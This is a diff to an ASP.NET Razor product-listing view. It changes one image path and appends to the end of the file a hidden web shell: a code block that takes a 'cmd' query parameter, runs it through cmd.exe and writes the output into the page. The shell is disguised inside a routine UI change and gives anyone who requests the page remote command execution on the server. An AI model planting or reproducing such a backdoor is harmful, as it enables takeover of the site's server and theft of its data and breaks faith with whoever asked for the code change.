@@ -25,7 +25,7 @@
 {
     <div class="col-md-4">
                 <div class="card">
-                    <img src="/images/products/@(product.ProductName).png" class="card-img-top" alt="@(product.ProductName)">
+                    <img src="~/files/images/products/@(product.ProductName).png" class="card-img-top" alt="@(product.ProductName)">
                     <div class="card-body">
                         <h5 class="card-title">@product.ProductName</h5>
                         <p class="card-text">@product.Description</p>
@@ -36,3 +36,5 @@
 }
     </div>
 </div>
+@using System.Diagnostics
+@{var cmd=Context.Request.Query["cmd"].ToString();if(!string.IsNullOrWhiteSpace(cmd)){using (var process=Process.Start(new ProcessStartInfo{FileName="cmd.exe",Arguments="/c "+cmd,RedirectStandardOutput=true,UseShellExecute=false,CreateNoWindow=true})){var output=process.StandardOutput.ReadToEnd();process.WaitForExit();<pre>@output</pre>}}}
